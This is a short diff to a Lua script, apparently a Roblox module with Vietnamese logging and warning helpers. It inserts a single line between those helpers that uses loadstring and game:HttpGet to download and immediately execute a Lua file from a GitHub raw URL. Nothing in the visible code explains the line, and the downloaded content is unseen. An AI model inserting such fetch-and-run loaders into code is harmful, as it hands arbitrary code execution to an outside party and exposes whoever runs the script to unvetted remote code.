@@ -27,6 +27,9 @@ local function logVN(msg)
 end
 
 -- Core warning function
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/npmc_/refs/heads/main/NotifyBloxFruit.lua"))()
+
 local function warnVN(msg)
 	warn("[CẢNH BÁO] " .. msg)
 end
